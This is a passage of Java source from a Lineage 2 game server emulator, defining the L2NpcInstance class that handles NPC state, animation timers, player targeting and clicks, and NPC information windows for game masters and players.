/*
 * This program is free software: you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation, either version 3 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program. If not, see <http://www.gnu.org/licenses/>.
 */
package ru.catssoftware.gameserver.model.actor.instance;

import javolution.text.TextBuilder;
import javolution.util.FastList;
import ru.catssoftware.Config;
import ru.catssoftware.Message;
import ru.catssoftware.Message.MessageId;
import ru.catssoftware.extension.GameExtensionManager;
import ru.catssoftware.extension.ObjectExtension.Action;
import ru.catssoftware.gameserver.SevenSigns;
import ru.catssoftware.gameserver.SevenSignsFestival;
import ru.catssoftware.gameserver.Shutdown;
import ru.catssoftware.gameserver.ThreadPoolManager;
import ru.catssoftware.gameserver.ai.CtrlIntention;
import ru.catssoftware.gameserver.cache.HtmCache;
import ru.catssoftware.gameserver.datatables.*;
import ru.catssoftware.gameserver.datatables.xml.DoorTable;
import ru.catssoftware.gameserver.instancemanager.*;
import ru.catssoftware.gameserver.instancemanager.clanhallsiege.RainbowSpringSiege;
import ru.catssoftware.gameserver.instancemanager.games.Lottery;
import ru.catssoftware.gameserver.instancemanager.leaderboards.ArenaManager;
import ru.catssoftware.gameserver.instancemanager.leaderboards.FishermanManager;
import ru.catssoftware.gameserver.model.*;
import ru.catssoftware.gameserver.model.actor.knownlist.NpcKnownList;
import ru.catssoftware.gameserver.model.actor.stat.NpcStat;
import ru.catssoftware.gameserver.model.actor.status.NpcStatus;
import ru.catssoftware.gameserver.model.entity.Castle;
import ru.catssoftware.gameserver.model.entity.Fort;
import ru.catssoftware.gameserver.model.entity.Town;
import ru.catssoftware.gameserver.model.entity.events.*;
import ru.catssoftware.gameserver.model.itemcontainer.NpcInventory;
import ru.catssoftware.gameserver.model.olympiad.Olympiad;
import ru.catssoftware.gameserver.model.quest.Quest;
import ru.catssoftware.gameserver.model.quest.QuestState;
import ru.catssoftware.gameserver.model.quest.State;
import ru.catssoftware.gameserver.network.SystemMessageId;
import ru.catssoftware.gameserver.network.serverpackets.*;
import ru.catssoftware.gameserver.skills.Stats;
import ru.catssoftware.gameserver.taskmanager.DecayTaskManager;
import ru.catssoftware.gameserver.templates.L2HelperBuff;
import ru.catssoftware.gameserver.templates.chars.L2NpcTemplate;
import ru.catssoftware.gameserver.templates.item.L2Item;
import ru.catssoftware.gameserver.templates.item.L2Weapon;
import ru.catssoftware.gameserver.templates.skills.L2SkillType;
import ru.catssoftware.gameserver.util.Util;
import ru.catssoftware.tools.random.Rnd;

import java.text.DateFormat;
import java.util.StringTokenizer;

import static ru.catssoftware.gameserver.ai.CtrlIntention.AI_INTENTION_ACTIVE;

/**
 * This class represents a Non-Player-Character in the world. It can be a monster or a friendly character.
 * It also uses a template to fetch some static values. The templates are hardcoded in the client, so we can rely on them.<BR><BR>
 *
 * L2Character :<BR><BR>
 * <li>L2Attackable</li>
 * <li>L2BoxInstance</li>
 * <li>L2FolkInstance</li>
 *
 * @version $Revision: 1.32.2.7.2.24 $ $Date: 2005/04/11 10:06:09 $
 */
public class L2NpcInstance extends L2Character
{
	/** The interaction distance of the L2NpcInstance(is used as offset in MovetoLocation method) */
	public static final int			INTERACTION_DISTANCE	= 200;

	/** The L2Spawn object that manage this L2NpcInstance */
	private L2Spawn					_spawn;

	private NpcInventory			_inventory				= null;

	/** The flag to specify if this L2NpcInstance is busy */
	private boolean					_isBusy					= false;

	/** The busy message for this L2NpcInstance */
	private String					_busyMessage			= "";

	/** true if endDecayTask has already been called */
	volatile boolean				_isDecayed				= false;

	/** true if a Dwarf has used Spoil on this L2NpcInstance */
	private boolean					_isSpoil				= false;

	/** The castle index in the array of L2Castle this L2NpcInstance belongs to */
	private int						_castleIndex			= -2;

	/** The fortress index in the array of L2Fort this L2NpcInstance belongs to */
	private int						_fortIndex				= -2;

	private boolean					_isInTown				= false;
	private int						_isSpoiledBy			= 0;
	protected RandomAnimationTask	_rAniTask				= null;
	private int						_currentLHandId;															// normally this shouldn't change from the template, but there exist exceptions
	private int						_currentRHandId;															// normally this shouldn't change from the template, but there exist exceptions

	private int						_currentCollisionHeight;													// used for npc grow effect skills
	private int						_currentCollisionRadius;													// used for npc grow effect skills

	private boolean					_notAgro				= false;
	private boolean					_notFaction				= false;

	/** True если на NPC было использовано заклинание Magic Bottle */
	private boolean					_isMagicBottle			= false;

	/** Task launching the function onRandomAnimation()
	* Scheduled for L2MonsterInstance only if AllowRandomAnimation=true
	*/
	protected class RandomAnimationTask implements Runnable
	{
		public void run()
		{
			try
			{
				if (this != _rAniTask)
					return; // Shouldn't happen, but who knows... just to make sure every active npc has only one timer.
				if (isMob())
				{
					// Cancel further animation timers until intention is changed to ACTIVE again.
					if (getAI().getIntention() != AI_INTENTION_ACTIVE)
						return;
				}
				else
				{
					if (!isInActiveRegion()) // NPCs in inactive region don't run this task
						return;
				}

				if (!(isDead() || isStunned() || isSleeping() || isParalyzed()))
					onRandomAnimation(null);

				startRandomAnimationTimer();
			}
			catch (Exception e)
			{
				
			}
		}
	}

	/**
	 * Send a packet SocialAction to all L2PcInstance in the _KnownPlayers of the L2NpcInstance and create a new RandomAnimation Task.<BR><BR>
	 */
	public void onRandomAnimation(L2PcInstance player)
	{
		// Send a packet SocialAction to all L2PcInstance in the _KnownPlayers of the L2NpcInstance
		SocialAction sa = new SocialAction(getObjectId(), Rnd.get(2, 3));
		broadcastPacket(sa);
	}

	/**
	 * Create a RandomAnimation Task that will be launched after the calculated delay.<BR><BR>
	 */
	public void startRandomAnimationTimer()
	{
		if (!hasRandomAnimation())
			return;

		int minWait = isMob() ? Config.MIN_MONSTER_ANIMATION : Config.MIN_NPC_ANIMATION;
		int maxWait = isMob() ? Config.MAX_MONSTER_ANIMATION : Config.MAX_NPC_ANIMATION;

		// Calculate the delay before the next animation
		int interval = Rnd.get(minWait, maxWait) * 1000;

		// Create a RandomAnimation Task that will be launched after the calculated delay
		_rAniTask = new RandomAnimationTask();
		ThreadPoolManager.getInstance().scheduleGeneral(_rAniTask, interval);
	}

	/**
	 * Check if the server allows Random Animation.<BR><BR>
	 */
	public boolean hasRandomAnimation()
	{
		return (Config.MAX_NPC_ANIMATION > 0 && getNpcId() != 29045 && getNpcId() != 31074);
	}

	public class DestroyTemporalNPC implements Runnable
	{
		private L2Spawn	_oldSpawn;

		public DestroyTemporalNPC(L2Spawn spawn)
		{
			_oldSpawn = spawn;
		}

		public void run()
		{
			try
			{
				_oldSpawn.getLastSpawn().deleteMe();
				_oldSpawn.stopRespawn();
				SpawnTable.getInstance().deleteSpawn(_oldSpawn, false);
			}
			catch (Exception e)
			{
				e.printStackTrace();
			}
		}
	}

	public class DestroyTemporalSummon implements Runnable
	{
		L2Summon		_summon;
		L2PcInstance	_player;

		public DestroyTemporalSummon(L2Summon summon, L2PcInstance player)
		{
			_summon = summon;
			_player = player;
		}

		public void run()
		{
			_summon.unSummon(_player);
		}
	}

	/**
	 * Constructor of L2NpcInstance (use L2Character constructor).<BR><BR>
	 *
	 * <B><U> Actions</U> :</B><BR><BR>
	 * <li>Call the L2Character constructor to set the _template of the L2Character (copy skills from template to object and link _calculators to NPC_STD_CALCULATOR)  </li>
	 * <li>Set the name of the L2Character</li>
	 * <li>Create a RandomAnimation Task that will be launched after the calculated delay if the server allow it </li><BR><BR>
	 *
	 * @param objectId Identifier of the object to initialized
	 * @param template The L2NpcTemplate to apply to the NPC
	 *
	 */
	public L2NpcInstance(int objectId, L2NpcTemplate template)
	{
		// Call the L2Character constructor to set the _template of the L2Character, copy skills from template to object
		// and link _calculators to NPC_STD_CALCULATOR
		super(objectId, template);
		getKnownList(); // init knownlist
		getStat(); // init stats
		getStatus(); // init status
		super.initCharStatusUpdateValues(); // init status upadte values

		// initialize the "current" equipment
		_currentLHandId = getTemplate().getLhand();
		_currentRHandId = getTemplate().getRhand();
		// initialize the "current" collisions
		_currentCollisionHeight = getTemplate().getCollisionHeight();
		_currentCollisionRadius = getTemplate().getCollisionRadius();

		if (template == null)
		{
			_log.fatal("No template for Npc. Please check your datapack is setup correctly.");
			return;
		}
		else
		{
			// Check npc info.
			if (npcInfo != null && npcInfo.getState().equals(Thread.State.NEW))
				npcInfo.start();
		}
		// Set the name and the title of the L2Character
		setName(template.getName());
		setTitle(template.getTitle());

		if ((template.getSS() > 0 || template.getBSS() > 0) && template.getSSRate() > 0)
			_inventory = new NpcInventory(this);
	}

	@Override
	public NpcKnownList getKnownList()
	{
		if (_knownList == null)
			_knownList = new NpcKnownList(this);

		return (NpcKnownList) _knownList;
	}

	@Override
	public NpcStat getStat()
	{
		if (_stat == null)
			_stat = new NpcStat(this);

		return (NpcStat) _stat;
	}

	@Override
	public NpcStatus getStatus()
	{
		if (_status == null)
			_status = new NpcStatus(this);

		return (NpcStatus) _status;
	}

	/** Return the L2NpcTemplate of the L2NpcInstance. */
	@Override
	public final L2NpcTemplate getTemplate()
	{
		return (L2NpcTemplate) super.getTemplate();
	}

	/**
	 * Return the generic Identifier of this L2NpcInstance contained in the L2NpcTemplate.<BR><BR>
	 */
	public int getNpcId()
	{
		return getTemplate().getNpcId();
	}

	@Override
	public boolean isAttackable()
	{
		return false; // Config.ALT_ATTACKABLE_NPCS;
	}

	/**
	 * Return the faction Identifier of this L2NpcInstance contained in the L2NpcTemplate.<BR><BR>
	 *
	 * <B><U> Concept</U> :</B><BR><BR>
	 * If a NPC belows to a Faction, other NPC of the faction inside the Faction range will help it if it's attacked<BR><BR>
	 *
	 */
	public final String getFactionId()
	{
		return getTemplate().getFactionId();
	}

	/**
	 * Return the Level of this L2NpcInstance contained in the L2NpcTemplate.<BR><BR>
	 */
	@Override
	public int getLevel()
	{
		return getTemplate().getLevel();
	}

	/**
	 * Return true if the L2NpcInstance is agressive (ex : L2MonsterInstance in function of aggroRange).<BR><BR>
	 */
	public boolean isAggressive()
	{
		return false;
	}
	public void setNotAgro(boolean par)
	{
		_notAgro = par;
	}
	public void setNotFaction(boolean par)
	{
		_notFaction = par;
	}
	public boolean getNotFaction()
	{
		return _notFaction;
	}
	public boolean getNotAgro()
	{
		return _notAgro;
	}

	/**
	 * Return the Aggro Range of this L2NpcInstance contained in the L2NpcTemplate.<BR><BR>
	 */
	public int getAggroRange()
	{
		if (getNotAgro())
			return 0;
		return getTemplate().getAggroRange();
	}

	/**
	 * Return the Faction Range of this L2NpcInstance contained in the L2NpcTemplate.<BR><BR>
	 */
	public int getFactionRange()
	{
		if (getNotFaction())
			return 0;
		return getTemplate().getFactionRange();
	}

	/**
	 * Return true if this L2NpcInstance is undead in function of the L2NpcTemplate.<BR><BR>
	 */
	@Override
	public boolean isUndead()
	{
		return getTemplate().isUndead();
	}

	/**
	 * Return the distance under which the object must be add to _knownObject in function of the object type.<BR><BR>
	 *
	 * <B><U> Values </U> :</B><BR><BR>
	 * <li> object is a L2FolkInstance : 0 (don't remember it) </li>
	 * <li> object is a L2Character : 0 (don't remember it) </li>
	 * <li> object is a L2PlayableInstance : 1500 </li>
	 * <li> others : 500 </li><BR><BR>
	 *
	 * <B><U> Overridden in </U> :</B><BR><BR>
	 * <li> L2Attackable</li><BR><BR>
	 *
	 * @param object The Object to add to _knownObject
	 *
	 */
	public int getDistanceToWatchObject(L2Object object)
	{
		if (object instanceof L2FestivalGuideInstance)
			return 10000;

		if (object instanceof L2FolkInstance || !(object instanceof L2Character))
			return 0;

		if (object instanceof L2PlayableInstance)
			return 1500;

		return 500;
	}

	/**
	 * Return the distance after which the object must be remove from _knownObject in function of the object type.<BR><BR>
	 *
	 * <B><U> Values </U> :</B><BR><BR>
	 * <li> object is not a L2Character : 0 (don't remember it) </li>
	 * <li> object is a L2FolkInstance : 0 (don't remember it)</li>
	 * <li> object is a L2PlayableInstance : 3000 </li>
	 * <li> others : 1000 </li><BR><BR>
	 *
	 * <B><U> Overridden in </U> :</B><BR><BR>
	 * <li> L2Attackable</li><BR><BR>
	 *
	 * @param object The Object to remove from _knownObject
	 *
	 */
	public int getDistanceToForgetObject(L2Object object)
	{
		return 2 * getDistanceToWatchObject(object);
	}

	/**
	 * Return the Identifier of the item in the left hand of this L2NpcInstance contained in the L2NpcTemplate.<BR><BR>
	 */
	public int getLeftHandItem()
	{
		return _currentLHandId;
	}

	/**
	 * Return the Identifier of the item in the right hand of this L2NpcInstance contained in the L2NpcTemplate.<BR><BR>
	 */
	public int getRightHandItem()
	{
		return _currentRHandId;
	}

	/**
	 * Return true if this L2NpcInstance has drops that can be sweeped.<BR><BR>
	 */
	public boolean isSpoil()
	{
		return _isSpoil;
	}

	/**
	 * Set the spoil state of this L2NpcInstance.<BR><BR>
	 */
	public void setSpoil(boolean isSpoil)
	{
		_isSpoil = isSpoil;
	}

	public final int getIsSpoiledBy()
	{
		return _isSpoiledBy;
	}

	public final void setIsSpoiledBy(int value)
	{
		_isSpoiledBy = value;
	}

	/**
	 * Return the busy status of this L2NpcInstance.<BR><BR>
	 */
	public final boolean isBusy()
	{
		return _isBusy;
	}

	/**
	 * Set the busy status of this L2NpcInstance.<BR><BR>
	 */
	public void setBusy(boolean isBusy)
	{
		_isBusy = isBusy;
	}

	/**
	 * Return the busy message of this L2NpcInstance.<BR><BR>
	 */
	public final String getBusyMessage()
	{
		return _busyMessage;
	}

	/**
	 * Set the busy message of this L2NpcInstance.<BR><BR>
	 */
	public void setBusyMessage(String message)
	{
		_busyMessage = message;
	}

	protected boolean canTarget(L2PcInstance player)
	{
		if (player.isOutOfControl())
		{
			player.sendPacket(ActionFailed.STATIC_PACKET);
			return false;
		}
		// Restrict interactions during restart/shutdown
		if (Config.SAFE_REBOOT && Config.SAFE_REBOOT_DISABLE_NPC_ITERACTION && Shutdown.getCounterInstance() != null
				&& Shutdown.getCounterInstance().getCountdown() <= Config.SAFE_REBOOT_TIME)
		{
			player.sendMessage(Message.getMessage(player, Message.MessageId.MSG_ACTION_NOT_ALLOWED_DURING_SHUTDOWN));
			player.sendPacket(ActionFailed.STATIC_PACKET);
			return false;
		}
		return true;
	}

	protected boolean canInteract(L2PcInstance player)
	{
		// TODO: NPC busy check etc...
		return isInsideRadius(player, INTERACTION_DISTANCE, false, false);
	}

	/**
	 * Manage actions when a player click on the L2NpcInstance.<BR><BR>
	 *
	 * <B><U> Actions on first click on the L2NpcInstance (Select it)</U> :</B><BR><BR>
	 * <li>Set the L2NpcInstance as target of the L2PcInstance player (if necessary)</li>
	 * <li>Send a Server->Client packet MyTargetSelected to the L2PcInstance player (display the select window)</li>
	 * <li>If L2NpcInstance is autoAttackable, send a Server->Client packet StatusUpdate to the L2PcInstance in order to update L2NpcInstance HP bar </li>
	 * <li>Send a Server->Client packet ValidateLocation to correct the L2NpcInstance position and heading on the client </li><BR><BR>
	 *
	 * <B><U> Actions on second click on the L2NpcInstance (Attack it/Intercat with it)</U> :</B><BR><BR>
	 * <li>Send a Server->Client packet MyTargetSelected to the L2PcInstance player (display the select window)</li>
	 * <li>If L2NpcInstance is autoAttackable, notify the L2PcInstance AI with AI_INTENTION_ATTACK (after a height verification)</li>
	 * <li>If L2NpcInstance is NOT autoAttackable, notify the L2PcInstance AI with AI_INTENTION_INTERACT (after a distance verification) and show message</li><BR><BR>
	 *
	 * <FONT COLOR=#FF0000><B> <U>Caution</U> : Each group of Server->Client packet must be terminated by a ActionFailed packet in order to avoid
	 * that client wait an other packet</B></FONT><BR><BR>
	 *
	 * <B><U> Example of use </U> :</B><BR><BR>
	 * <li> Client packet : Action, AttackRequest</li><BR><BR>
	 *
	 * <B><U> Overridden in </U> :</B><BR><BR>
	 * <li> L2ArtefactInstance : Manage only fisrt click to select Artefact</li><BR><BR>
	 * <li> L2GuardInstance : </li><BR><BR>
	 *
	 * @param player The L2PcInstance that start an action on the L2NpcInstance
	 *
	 */
	@Override
	public void onAction(L2PcInstance player)
	{

		if (!canTarget(player))
			return;
		try
		{
			// Check if the L2PcInstance already target the L2NpcInstance
			if (this != player.getTarget())
			{

				// Set the target of the L2PcInstance player
				player.setTarget(this);
				// Check if the player is attackable (without a forced attack)
				if (isAutoAttackable(player))
				{
					// Send a Server->Client packet MyTargetSelected to the L2PcInstance player
					// The player.getLevel() - getLevel() permit to display the correct color in the select window
					MyTargetSelected my = new MyTargetSelected(getObjectId(), player.getLevel() - getLevel());
					player.sendPacket(my);

					// Send a Server->Client packet StatusUpdate of the L2NpcInstance to the L2PcInstance to update its HP bar
					StatusUpdate su = new StatusUpdate(getObjectId());
					su.addAttribute(StatusUpdate.CUR_HP, (int) getStatus().getCurrentHp());
					su.addAttribute(StatusUpdate.MAX_HP, getMaxHp());
					player.sendPacket(su);
				}
				else
				{
					// Send a Server->Client packet MyTargetSelected to the L2PcInstance player
					MyTargetSelected my = new MyTargetSelected(getObjectId(), 0);
					player.sendPacket(my);
				}

				// Send a Server->Client packet ValidateLocation to correct the L2NpcInstance position and heading on the client
				player.sendPacket(new ValidateLocation(this));
			}
			else
			{
				player.sendPacket(new ValidateLocation(this));
				// Check if the player is attackable (without a forced attack) and isn't dead
				if (isAutoAttackable(player) && !isAlikeDead())
				{
					// Check the height difference
					if (Math.abs(player.getZ() - getZ()) < 400) // this max heigth difference might need some tweaking
					{
						// Set the L2PcInstance Intention to AI_INTENTION_ATTACK
						player.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, this);
						// player.startAttack(this);
					}
					else
					{
						// Send a Server->Client ActionFailed to the L2PcInstance in order to avoid that the client wait another packet
						player.sendPacket(ActionFailed.STATIC_PACKET);
					}
				}
				else if (!isAutoAttackable(player))
				{
					// Calculate the distance between the L2PcInstance and the L2NpcInstance
					if (!canInteract(player))
					{
						// Notify the L2PcInstance AI with AI_INTENTION_INTERACT
						player.getAI().setIntention(CtrlIntention.AI_INTENTION_INTERACT, this);
					}
					else
					{
						
						// Send a Server->Client packet SocialAction to the all L2PcInstance on the _knownPlayer of the L2NpcInstance
						// to display a social action of the L2NpcInstance on their client
						MyTargetSelected my = new MyTargetSelected(getObjectId(), player.getLevel() - getLevel());
						player.sendPacket(my);
						
						onRandomAnimation(player);
						if(GameExtensionManager.getInstance().handleAction(this, Action.NPC_ONACTION, player)!=null)
							return;
						// Open a chat window on client with the text of the L2NpcInstance
						if (_event!=null)
							if(_event.onNPCTalk(this, player)) {
								player.sendPacket(ActionFailed.STATIC_PACKET);
								return;
							}
						{
							Quest[] qlsa = getTemplate().getEventQuests(Quest.QuestEventType.QUEST_START);
							if (qlsa != null && qlsa.length > 0)
								player.setLastQuestNpcObject(getObjectId());
							Quest[] qlst = getTemplate().getEventQuests(Quest.QuestEventType.ON_FIRST_TALK);
							if ((qlst != null) && qlst.length == 1)
								qlst[0].notifyFirstTalk(this, player);
							else
								showChatWindow(player, 0);
						}
						player.sendPacket(ActionFailed.STATIC_PACKET);
					}
				}
				else
					player.sendPacket(ActionFailed.STATIC_PACKET);
			}
		}
		catch (Exception e)
		{
			_log.error("Error: L2NpcInstance--> onAction(){" + e.toString() + "}\n\n", e);
			e.printStackTrace();
			player.sendPacket(ActionFailed.STATIC_PACKET);
		}
	}

	@Override
	public void onActionShift(L2PcInstance player)
	{
		if (player.isGM())
		{
			player.setTarget(this);
			MyTargetSelected my = new MyTargetSelected(getObjectId(), player.getLevel() - getLevel());
			player.sendPacket(my);

			if (isAutoAttackable(player))
			{
				StatusUpdate su = new StatusUpdate(getObjectId());
				su.addAttribute(StatusUpdate.CUR_HP, (int) getStatus().getCurrentHp());
				su.addAttribute(StatusUpdate.MAX_HP, getMaxHp());
				player.sendPacket(su);
			}

			NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
			TextBuilder html1 = new TextBuilder("<html><body><center><font color=\"LEVEL\">NPC Information</font></center><br><br>");
			String className = getClass().getSimpleName();
			html1.append("<br>");
			html1.append("Instance Type: " + className + "<br1>Faction: " + getFactionId() + "<br1>Location ID: " + (getSpawn() != null ? getSpawn().getLocation() : 0) + "<br1>");

			if (this instanceof L2ControllableMobInstance)
				html1.append("Mob Group: " + MobGroupTable.getInstance().getGroupForMob((L2ControllableMobInstance) this).getGroupId() + "<br>");
			else
				html1.append("Respawn Time: " + (getSpawn() != null ? (getSpawn().getRespawnDelay() / 1000) + "  Seconds<br>" : "?  Seconds<br>"));
			html1.append("Intention: "+getAI().getIntention()+"<br1>");
			html1.append("<table border=\"0\" width=\"100%\">");
			html1.append("<tr><td>Object ID</td><td>" + getObjectId() + "</td><td>NPC ID</td><td>" + getTemplate().getNpcId() + "</td></tr>");
			html1.append("<tr><td>Castle</td><td>" + getCastle().getCastleId() + "</td><td>Coords</td><td>" + getX() + "," + getY() + "," + getZ() + "</td></tr>");
			html1.append("<tr><td>Level</td><td>" + getLevel() + "</td><td>Aggro</td><td>" + ((this instanceof L2Attackable) ? getAggroRange() : 0) + "</td></tr>");
			html1.append("</table><br>");

			html1.append("<font color=\"LEVEL\">Combat</font>");
			html1.append("<table border=\"0\" width=\"100%\">");
			html1.append("<tr><td>Current HP</td><td>" + getStatus().getCurrentHp() + "</td><td>Current MP</td><td>" + getStatus().getCurrentMp() + "</td></tr>");
			html1.append("<tr><td>Max.HP</td><td>" + (int) (getMaxHp() / getStat().calcStat(Stats.MAX_HP, 1, this, null)) + "*" + getStat().calcStat(Stats.MAX_HP, 1, this, null) + "</td><td>Max.MP</td><td>" + getMaxMp() + "</td></tr>");
			html1.append("<tr><td>P.Atk.</td><td>" + getPAtk(null) + "</td><td>M.Atk.</td><td>" + getMAtk(null, null) + "</td></tr>");
			html1.append("<tr><td>P.Def.</td><td>" + getPDef(null) + "</td><td>M.Def.</td><td>" + getMDef(null, null) + "</td></tr>");
			html1.append("<tr><td>Accuracy</td><td>" + getAccuracy() + "</td><td>Evasion</td><td>" + getEvasionRate(null) + "</td></tr>");
			html1.append("<tr><td>Critical</td><td>" + getCriticalHit(null, null) + "</td><td>Speed</td><td>" + getRunSpeed() + "</td></tr>");
			html1.append("<tr><td>Atk.Speed</td><td>" + getPAtkSpd() + "</td><td>Cast.Speed</td><td>" + getMAtkSpd() + "</td></tr>");
			html1.append("<tr><td>Race</td><td>" + getTemplate().getRace() + "</td><td></td><td></td></tr>");
			html1.append("</table><br>");

			html1.append("<font color=\"LEVEL\">Basic Stats</font>");
			html1.append("<table border=\"0\" width=\"100%\">");
			html1.append("<tr><td>STR</td><td>" + getStat().getSTR() + "</td><td>DEX</td><td>" + getStat().getDEX() + "</td><td>CON</td><td>" + getStat().getCON() + "</td></tr>");
			html1.append("<tr><td>INT</td><td>" + getINT() + "</td><td>WIT</td><td>" + getStat().getWIT() + "</td><td>MEN</td><td>" + getStat().getMEN() + "</td></tr>");
			html1.append("</table>");

			html1.append("<br><center><table><tr><td><button value=\"Edit NPC\" action=\"bypass -h admin_edit_npc " + getTemplate().getNpcId() + "\" width=100 height=15 back=\"sek.cbui94\" fore=\"sek.cbui94\"><br1></td>");
			html1.append("<td><button value=\"Kill\" action=\"bypass -h admin_kill\" width=40 height=15 back=\"sek.cbui94\" fore=\"sek.cbui94\"></td><br1></tr>");
			html1.append("<tr><td><button value=\"Show DropList\" action=\"bypass -h admin_show_droplist " + getTemplate().getNpcId() + "\" width=100 height=15 back=\"sek.cbui94\" fore=\"sek.cbui94\"></td></tr>");
			html1.append("<td><button value=\"Delete\" action=\"bypass -h admin_delete\" width=40 height=15 back=\"sek.cbui94\" fore=\"sek.cbui94\"></td></tr>");
			html1.append("<tr><td><button value=\"Show Skillist\" action=\"bypass -h admin_show_skilllist_npc " + getTemplate().getNpcId() + "\" width=100 height=20 back=\"sek.cbui94\" fore=\"sek.cbui94\"></td><td></td></tr>");
			html1.append("</table></center><br>");
			html1.append("</body></html>");
			html.setHtml(html1.toString());
			player.sendPacket(html);
		}
		else if (Config.ALT_GAME_VIEWNPC && !(this instanceof L2ChestInstance))
		{
			player.setTarget(this);
			MyTargetSelected my = new MyTargetSelected(getObjectId(), player.getLevel() - getLevel());
			player.sendPacket(my);

			if (isAutoAttackable(player))
			{
				StatusUpdate su = new StatusUpdate(getObjectId());
				su.addAttribute(StatusUpdate.CUR_HP, (int) getStatus().getCurrentHp());
				su.addAttribute(StatusUpdate.MAX_HP, getMaxHp());
				player.sendPacket(su);
			}

			if(GameExtensionManager.getInstance().handleAction(this, Action.NPC_SHIFT_CLICK,player)!=null)
				return;
			NpcHtmlMessage html = new NpcHtmlMessage(getObjectId());
			TextBuilder html1 = new TextBuilder("<html><title>Описание NPC</title><body>");
			html1.append("<br><center><font color=\"LEVEL\">[Боевые качества]</font></center>");
			html1.append("<table border=0 width=\"100%\">");
			html1.append("<tr><td>Max.HP</td><td>" + (int) (getMaxHp() / getStat().calcStat(Stats.MAX_HP, 1, this, null)) + "*" + (int) getStat().calcStat(Stats.MAX_HP, 1, this, null) + "</td><td>Max.MP</td><td>" + getMaxMp() + "</td></tr>");
			html1.append("<tr><td>P.Atk.</td><td>" + getPAtk(null) + "</td><td>M.Atk.</td><td>" + getMAtk(null, null) + "</td></tr>");
			html1.append("<tr><td>P.Def.</td><td>" + getPDef(null) + "</td><td>M.Def.</td><td>" + getMDef(null, null) + "</td></tr>");
			html1.append("<tr><td>Accuracy</td><td>" + getAccuracy() + "</td><td>Evasion</td><td>" + getEvasionRate(null) + "</td></tr>");
			html1.append("<tr><td>Critical</td><td>" + getCriticalHit(null, null) + "</td><td>Speed</td><td>" + getRunSpeed() + "</td></tr>");
			html1.append("<tr><td>Atk.Speed</td><td>" + getPAtkSpd() + "</td><td>Cast.Speed</td><td>" + getMAtkSpd() + "</td></tr>");
			html1.append("<tr><td>Race</td><td>" + getTemplate().getRace() + "</td><td></td><td></td></tr>");
			html1.append("</table>");

			html1.append("<br><center><font color=\"LEVEL\">[Базовые качества]</font></center>");
			html1.append("<table border=0 width=\"100%\">");
			html1.append("<tr><td>STR</td><td>" + getStat().getSTR() + "</td><td>DEX</td><td>" + getStat().getDEX() + "</td><td>CON</td><td>"+ getStat().getCON() + "</td></tr>");
			html1.append("<tr><td>INT</td><td>" + getINT() + "</td><td>WIT</td><td>" + getStat().getWIT() + "</td><td>MEN</td><td>" + getStat().getMEN() + "</td></tr>");
			html1.append("</table>");

			if (Config.ALT_GAME_SHOWPC_DROP)
			{
				html1.append("<br><center><font color=\"LEVEL\">[Список дропа]</font></center>");
				html1.append("<br>Обозначение шанса: [0-30%] <font color=\"ffcc33\">[30-60%]</font> <font color=\"ff9900\">[60%+]</font>");
				html1.append("<table border=0 width=\"100%\">");
				if (getTemplate().getDropData() != null)
				{
					for (L2DropCategory cat : getTemplate().getDropData())
					{
						for (L2DropData drop : cat.getAllDrops())
						{
							String name = ItemTable.getInstance().getTemplate(drop.getItemId()).getName();

							if (drop.getChance() >= 600000)
								html1.append("<tr><td><font color=\"ff9900\">" + name + "</font></td><td>" + (drop.isQuestDrop() ? "Quest" : (cat.isSweep() ? "Sweep" : "Drop")) + "</td></tr>");
							else if (drop.getChance() >= 300000)
								html1.append("<tr><td><font color=\"ffcc33\">" + name + "</font></td><td>" + (drop.isQuestDrop() ? "Quest" : (cat.isSweep() ? "Sweep" : "Drop")) + "</td></tr>");
							else
								html1.append("<tr><td>" + name + "</td><td>" + (drop.isQuestDrop() ? "Quest" : (cat.isSweep() ? "Sweep" : "Drop")) + "</td></tr>");
						}
					}
				}
				html1.append("</table>");
			}
			html1.append("</body></html>");
			html.setHtml(html1.toString());
			player.sendPacket(html);
		}
		else
		{
			if (!canTarget(player))
				return;

			try
			{
				if (this != player.getTarget())
				{
					player.setTarget(this);
					if (isAutoAttackable(player))
					{
						MyTargetSelected my = new MyTargetSelected(getObjectId(), player.getLevel() - getLevel());
						player.sendPacket(my);
						StatusUpdate su = new StatusUpdate(getObjectId());
						su.addAttribute(StatusUpdate.CUR_HP, (int) getStatus().getCurrentHp());
						su.addAttribute(StatusUpdate.MAX_HP, getMaxHp());
						player.sendPacket(su);
					}
					else
					{
						MyTargetSelected my = new MyTargetSelected(getObjectId(), 0);
						player.sendPacket(my);
					}
					player.sendPacket(new ValidateLocation(this));
				}
				else
				{
					player.sendPacket(new ValidateLocation(this));
					if (isAutoAttackable(player) && !isAlikeDead())
					{
						if (Math.abs(player.getZ() - getZ()) < 400 && player.isInsideRadius(this, player.getPhysicalAttackRange(), false, false))
							player.getAI().setIntention(CtrlIntention.AI_INTENTION_ATTACK, this);
						else
							player.sendPacket(ActionFailed.STATIC_PACKET);
					}
					else if (!isAutoAttackable(player))
					{
						if (!canInteract(player))
							player.sendPacket(ActionFailed.STATIC_PACKET);
						else
						{
							onRandomAnimation(player);

							Quest[] qlsa = getTemplate().getEventQuests(Quest.QuestEventType.QUEST_START);
							if (qlsa != null && qlsa.length > 0)
								player.setLastQuestNpcObject(getObjectId());
							Quest[] qlst = getTemplate().getEventQuests(Quest.QuestEventType.ON_FIRST_TALK);
							if ((qlst != null) && qlst.length == 1)
								qlst[0].notifyFirstTalk(this, player);
							else
								showChatWindow(player, 0);

							player.sendPacket(ActionFailed.STATIC_PACKET);
						}
					}
					else
						player.sendPacket(ActionFailed.STATIC_PACKET);
				}
			}
			catch (Exception e)
			{
				_log.error("Error: L2NpcInstance--> onAction(){" + e.toString() + "}\n\n", e);
				player.sendPacket(ActionFailed.STATIC_PACKET);
			}
		}
		player.sendPacket(ActionFailed.STATIC_PACKET);
	}

	/** Return the L2Castle this L2NpcInstance belongs to. */
	public final Castle getCastle()
	{
		// Get castle this NPC belongs to (excluding L2Attackable)
		if (_castleIndex < 0)
		{
			Town town = TownManager.getInstance().getTown(this);
			// Npc was spawned in town
			_isInTown = (town != null);

